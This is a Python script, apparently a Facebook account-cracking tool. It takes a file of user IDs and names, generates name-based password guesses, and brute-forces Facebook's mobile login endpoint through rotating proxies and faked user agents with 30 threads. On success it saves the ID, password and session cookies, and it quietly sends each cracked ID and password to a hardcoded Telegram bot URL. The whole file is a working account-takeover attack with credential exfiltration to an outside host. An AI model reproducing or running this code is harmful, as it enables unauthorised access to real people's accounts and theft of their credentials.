
#Modul
import hashlib
import requests
import sys
import platform
import time
import datetime
import sys
import time
import requests
import requests
import random
import platform
import datetime
import requests
import sys
import time
import base64
import subprocess
import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor
import datetime  # Added for time calculation
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from urllib.parse import quote
import requests,bs4,json,os,sys,random,time,re
import urllib3,rich,base64
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#----------[ DATA-TIME ]----------#




from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import requests
cookies = {
    'datr': 'iZ2xY04E3jAca46uaLOJLWbL',
    'sb': 'iZ2xYyI7oe2HAXvfOpqjNV2N',
    'locale': 'fa_IR',
    'vpd': 'v1%3B737x393x2.75',
    'wd': '393x737',
    'fr': '03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
}

headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=BtcUZp1p-VII3ttL2j_AzIwh; sb=BtcUZuFlUQ7Ult0bipHJEXuy; m_pixel_ratio=2.75; ps_l=0; ps_n=0; wd=393x720; fr=04UWXACfhDALoC6yf..BmFNcG..AAA.0.0.BmFS74.AWW0R7wKfYI',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}


params = {
    'refid': '8',
}

data = {
    'lsd': 'AVqAhQPrMiI',
    'jazoest': '2963',
    'uid': '100076526146833',
    'flow': 'login_no_pin',
    'next': '',
}

response = requests.post(
    'https://mbasic.facebook.com/login/device-based/validate-pin/',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()
#DATE AND TIME
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day


try:
    prox = requests.get('https://github.com/B51Fire1/proxy/blob/main/Proxy.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()

try: 
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()


#USER-AGENTS
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
for xd in range(10000):
        a='Mozilla/5.0 (Symbian/3; Series60/'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='Nokia'
        e=random.randrange(100, 9999)
        f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Mobile Safari/535.1'
        uaku1=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugen.append(uaku1)


        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
        b=random.randrange(100, 9999)
        c=random.randrange(100, 9999)
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        h=random.randrange(1, 9)
        i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
        j=random.randrange(1, 9)
        k=random.randrange(1, 9)
        l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
        uaku3=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
        ugen2.append(uaku3)
#PROXYGEN

ua = ['Mozilla/5.0 (Linux; Android 9; SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/89.0.4389.90 Mobile Safari/537.36']
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#COLOR-CODE
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;32m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
a1 = '\x1b[1;31m'  # سور
a2 = '\x1b[1;34m'  # شین
a3 = '\x1b[1;32m'  # سەوز
a4 = '\x1b[1;33m'  # زەرد
a5 = '\x1b[38;5;208m'  # پرتەقاڵی
a6 = '\x1b[38;5;5m'  # مۆر
a7 = '\x1b[38;5;13m'  # پەمەیی
a8 = '\x1b[1;30m'  # ڕەش
a9 = '\x1b[1;37m'  # سپی
a10 = '\x1b[38;5;52m'  # قاوەیی
a11 = '\x1b[38;5;8m'  # خۆڵەمێشی
a12 = '\x1b[38;5;220m'  # زێڕین
a13 = '\x1b[38;5;7m'  # زیوی
a14 = '\x1b[38;5;153m'  # شینی کاڵ
a15 = '\x1b[38;5;18m'  # شینی تۆخ
a16 = '\x1b[38;5;48m'  # سەوزی کاڵ
a17 = '\x1b[38;5;22m'  # سەوزی تووخ
a18 = '\x1b[38;5;196m'  # سوری کاڵ
a19 = '\x1b[38;5;88m'  # سوری توخ
a20 = '\x1b[38;5;226m'  # زەردی کاڵ
a21 = '\x1b[38;5;136m'  # زەردی توخ
a22 = '\x1b[38;5;216m'  # پرتەقاڵی کاڵ
a23 = '\x1b[38;5;166m'  # پرتەقاڵێ توچ
asu = random.choice([m,O,h,u,b])

okc = 'X-FILE-OK-'+str(ta)+'.txt'
cpc = 'X-FILE-CP-'+str(ta)+'.txt'

def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"
#IPYTHONI
#lalo
def _____BRADOSTI_____(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def tahun(fx):
        if len(fx)==15:
                if fx[:10] in ['1000000000']       :tahunz = '2009'
                elif fx[:9] in ['100000000']       :tahunz = '2009'
                elif fx[:8] in ['10000000']        :tahunz = '2009'
                elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
                elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
                elif fx[:6] in ['100001']          :tahunz = '2010-2011'
                elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
                elif fx[:6] in ['100004']          :tahunz = '2012-2013'
                elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
                elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
                elif fx[:6] in ['100009']          :tahunz = '2015'
                elif fx[:5] in ['10001']           :tahunz = '2015-2016'
                elif fx[:5] in ['10002']           :tahunz = '2016-2017'
                elif fx[:5] in ['10003']           :tahunz = '2018'
                elif fx[:5] in ['10004']           :tahunz = '2019'
                elif fx[:5] in ['10005']           :tahunz = '2020'
                elif fx[:5] in ['10006','10007','10008','10009','100010','100011','100012']:tahunz = '2021-2022'
                else:tahunz=''
        elif len(fx) in [9,10]:
                tahunz = '2008-2009'
        elif len(fx)==8:
                tahunz = '2007-2008'
        elif len(fx)==7:
                tahunz = '2006-2007'
        else:tahunz=''
        return tahunz
def clear():
        os.system('clear')
def back():
        menu()
#LOGO
def banner():
        print("""\x1b[38;5;7m
        
 .S_sSSs     .S_SSSs     .S     S.    .S_SSSs    
.SS~YS%%b   .SS~SSSSS   .SS     SS.  .SS~SSSSS   
S%S   `S%b  S%S   SSSS  S%S     S%S  S%S   SSSS  
S%S    S%S  S%S    S%S  S%S     S%S  S%S    S%S  
S%S    d*S  S%S SSSS%S  S%S     S%S  S%S SSSS%S  
S&S   .S*S  S&S  SSS%S  S&S     S&S  S&S  SSS%S  
S&S_sdSSS   S&S    S&S  S&S     S&S  S&S    S&S  
S&S~YSY%b   S&S    S&S  S&S     S&S  S&S    S&S  
S*S   `S%b  S*S    S&S  S*S     S*S  S*S    S&S  
S*S    S%S  S*S    S*S  S*S  .  S*S  S*S    S*S  
S*S    S&S  S*S    S*S  S*S_sSs_S*S  S*S    S*S  
S*S    SSS  SSS    S*S  SSS~SSS~S*S  SSS    S*S  
SP                 SP                       SP   
Y                  Y                        Y    
                                                      


""")
os.system('clear')
banner()
#MENU
def menu():
       	print()
        print(f'\x1b[38;5;208m[ 1 ] CRACK FILE')
        #print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')

        _____BRADOSTI_____ = input(' chose :  ')
        if _____BRADOSTI_____ in ['1']:
                F()
                print(' \x1b[1;91m\x1b[1;96m{H} LogOut Successful ')
                exit()
        else:
                print(' \x1b[1;91m\x1b[1;96m\x1b[1;91m NOT SELECT ')
                back()
def error():
        print(f' \x1b[1;91m\x1b[1;96m{H} \x1b[1;91mBgarewa Bo Menu')
        time.sleep(2)
        back()
#INPUT-FILE
def F():
    os.system('clear');
    D().plerr()
    

class D:
        def __init__(self):
                self.id = []
        def plerr(self):
                os.system("clear")
                banner()
                try:
                        fileX = input ('\x1b[1;32mNAWY FILE   :  ')
                        for line in open(fileX, 'r').readlines():
                                id.append(line.strip())
                        print(f'\x1b[1;91mHAMW IDyakan : \x1b[1;97m'+str(len(id)))
                        Settings()
                except IOError:
                        print(" \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m file %s hallaya bam shewaya binusa /sdcard/nawyfile.txt\x1b[0m"%(fileX));time.sleep(2)
                        F()
#SERVER-SETTING			
def Settings():
        print('\x1b[1;93m RANDOM IDS ')
        print('')
        hu = "1"
        if hu in ['2','02']:
                for tua in sorted(id):
                        id2.append(tua)

        elif hu in ['1','1']:
                muda=[]
                for bacot in sorted(id):
                        muda.append(bacot)
                bcm=len(muda)
                bcmi=(bcm-1)
                for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -=1
        elif hu in ['111','01']:
                for bacot in id:
                        xx = random.randint(0,len(id2))
                        id2.insert(xx,bacot)
        else:
                print('\x1b[1;91m\x1b[1;96m{H}\x1b[1;91mNOT HALBZHERA')
                exit()

        print('\x1b[1;93m METHODE MOBILE')
        print('')
        hc = "1"
        if hc in ['1','01']:
                method.append('mobile')
        else:
                method.append('mobile')
        pwplus= "t"
        if pwplus in ['00','00']:
                pwpluss.append('ya')
                cetak(nel('[[cyan]•[white]] ENTER 6 CHARECTERS FOR CRACK PASS\n[[cyan]•[white]] LIKE --->[green] zaxo123,kurd123,hama1234[white] '))
                pwku=input('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPassword > \x1b[1;93m')
                pwkuh=pwku.split(',')
                for xpw in pwkuh:
                        pwnya.append(xpw)
        else:
                pwpluss.append('no')
        BB()
        exit()
def BB():
    os.system('clear')
    banner()
    passwrd()
def passwrd():
        #print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')
        #print(f"\x1b[1;93m    [+]BARWAR : \x1b[1;97m{ha}\x1b[1;97m/\x1b[1;97m{bu}\x1b[1;97m/\x1b[1;97m{ta} ")
        #print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')
        with tred(max_workers=30) as pool:
                for yuzong in id2:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        pwv = []
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(nmf)
                                        pwv.append(frs+frs)
                                        pwv.append(frs+'123')
                                        pwv.append(frs+'123321')
                                        pwv.append(frs+'1212')
                                        pwv.append(frs+'123123')
                                        pwv.append(frs+'1234')
                                        pwv.append(frs+'12345678')
                                        pwv.append(frs+'1234@')
                                        pwv.append(frs+'12345@')
                                        pwv.append(frs+'12345')
                                        pwv.append('12345678'+frs)
                                        pwv.append('123456789'+frs)
                                        pwv.append(frs+'11223344')
                                        pwv.append(frs+'112233')
                                        pwv.append(frs+'1995')
                                        pwv.append(frs+'1996')
                                        pwv.append(frs+'1997')
                                        pwv.append(frs+'1998')
                                        pwv.append(frs+'1999')
                                        pwv.append(frs+'2000')
                                        pwv.append(frs+'2001')
                                        pwv.append(frs+'2002')
                                        pwv.append(frs+'1122')
                                        pwv.append(frs+'1221')
                                        pwv.append(frs+'123'+frs)
                                        pwv.append(frs+'1234'+frs)
                                        pwv.append('123'+frs)
                                        pwv.append('1234'+frs)
                                        pwv.append('12345'+frs)
                                        pwv.append('123456'+frs)
                        else:
                                        pwv.append(nmf)
                                        pwv.append(frs+frs)
                                        pwv.append(frs+'123')
                                        pwv.append(frs+'123321')
                                        pwv.append(frs+'1212')
                                        pwv.append(frs+'123123')
                                        pwv.append(frs+'1234')
                                        pwv.append(frs+'12345678')
                                        pwv.append(frs+'1234@')
                                        pwv.append(frs+'12345@')
                                        pwv.append(frs+'12345')
                                        pwv.append('12345678'+frs)
                                        pwv.append('123456789'+frs)
                                        pwv.append(frs+'11223344')
                                        pwv.append(frs+'112233')
                                        pwv.append(frs+'1995')
                                        pwv.append(frs+'1996')
                                        pwv.append(frs+'1997')
                                        pwv.append(frs+'1998')
                                        pwv.append(frs+'1999')
                                        pwv.append(frs+'2000')
                                        pwv.append(frs+'2001')
                                        pwv.append(frs+'2002')
                                        pwv.append(frs+'1122')
                                        pwv.append(frs+'1221')
                                        pwv.append(frs+'123'+frs)
                                        pwv.append(frs+'1234'+frs)
                                        pwv.append('123'+frs)
                                        pwv.append('1234'+frs)
                                        pwv.append('12345'+frs)
                                        pwv.append('123456'+frs)

                        if 'ya' in pwpluss:
                                for xpwd in pwnya:
                                        pwv.append(xpwd)
                        else:pass
                        if 'mobile' in method:
                                pool.submit(crack,idf,pwv)
                        elif 'free' in method:
                                pool.submit(crackfree,idf,pwv)
                        elif 'touch' in method:
                                pool.submit(cracktouch,idf,pwv)
        print(f'\n{x}𝑮𝑶𝑶𝑫-𝑲𝑰𝑳𝑳𝑬𝑹 : {H}%s '%(ok))
        print(f'{x}𝑩𝑨𝑫-𝑲𝑰𝑳𝑳𝑬𝑹 : {m}%s '%(cp))
        print('Crack ( Y/t ) ? ')
        woi = input('{H} HALBZHERA  : ')
        if woi in ['y','Y']:
                back()
        else:
                print(f'\t \x1b[1;91m\x1b[1;96m{H} BYE {u} ')
                time.sleep(2)
                exit()
# simple update by @xu60ux
def crack(idf,pwv):
        global loop,ok,cp
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f"\r\x1b[1;32m{bo} [RaWa-M🤩] '\x1b[1;31m{a8}{loop}={len(id)} - \x1b[1;96mOK🥶>{a20}{ok} ")
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
                try:
                        nip=random.choice(prox)
                        proxs= {'http': 'socks4://'+nip}
                        ses.headers.update = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"iOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
                        p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
                        koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                        koki+=' m_pixel_ratio=2.625; wd=412x756'
                        headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"iOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}

                        po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=headers,allow_redirects=False,proxies=proxs)
#                        if "checkpoint" in po.cookies.get_dict().keys():
                        if "c_user" in ses.cookies.get_dict().keys():
                                ok+=1
                                coki=po.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                requests.get(f"https://api.telegram.org/bot7291662040:AAHdeqNUm62e-VlWLjnYL3seA9qgMkABHj4/sendMessage?chat_id=7155363713&text=\r {idf} | {pw}")
                                print(f'\r{a11} [ RaWa_OK✮ ]\n ID : {idf} : {pw} : {kuki}')
                                open('/sdcard/HaWa-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
                                #cek_DYNO(kuki)
                                break
                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
        loop+=1
def chek():
    os.system('clear')
    banner()
    menu()
    
def cek_DYNO(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))


if __name__=='__main__':
        try:os.system('git pull')
        except:pass
        try:os.mkdir('OK')
        except:pass
        try:os.mkdir('CP')
        except:pass
        try:os.mkdir('/sdcard/X - FILE')
        except:pass
        try:os.system('touch .prox.txt')
        except:pass
        chek()
